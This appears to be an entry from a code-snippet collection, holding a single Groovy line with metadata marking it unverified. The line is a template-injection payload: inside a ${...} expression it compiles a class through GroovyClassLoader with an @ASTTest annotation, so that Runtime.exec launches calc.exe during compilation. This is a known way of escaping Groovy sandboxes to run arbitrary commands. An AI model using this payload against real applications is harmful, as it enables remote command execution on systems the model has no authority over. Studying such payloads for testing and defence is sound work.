---
id: e8931cb2-328e-4fca-887d-6edfa5f7e950
type: code
language: groovy
verified: false
created_at: '2023-04-06T03:56:39.228792+00:00'
updated_at: '2023-04-10T20:23:43.191640+00:00'
---

# Code Snippet e8931cb2

**Language**: groovy

```groovy
${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```


